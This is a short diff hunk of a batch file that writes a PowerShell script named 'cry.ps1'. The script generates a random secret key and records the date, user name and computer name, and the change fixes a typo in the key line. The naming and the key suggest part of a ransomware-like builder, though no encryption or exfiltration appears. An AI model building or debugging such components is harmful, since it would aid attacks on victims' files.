@@ -131,7 +131,7 @@ set id=%RANDOM%-%RANDOM%-%RANDOM%
 
 echo $code1 = -join ((48..57) + (97..122) ^| Get-Random -Count 22 ^| %% {[char]$_}) > cry.ps1
 echo $code2 = -join ((48..57) + (97..122) ^| Get-Random -Count 21 ^| %% {[char]$_}) >> cry.ps1
-echo $secretkey= $ code1 + $code2 + "=" >> cry.ps1
+echo $secretkey = $code1 + $code2 + "=" >> cry.ps1
 echo $date = Get-Date -Format "dddd_dd/MM/yyyy_HH:mm" >> cry.ps1
 echo $user = $env:UserName >> cry.ps1
 echo $computername = $env:ComputerName >> cry.ps1
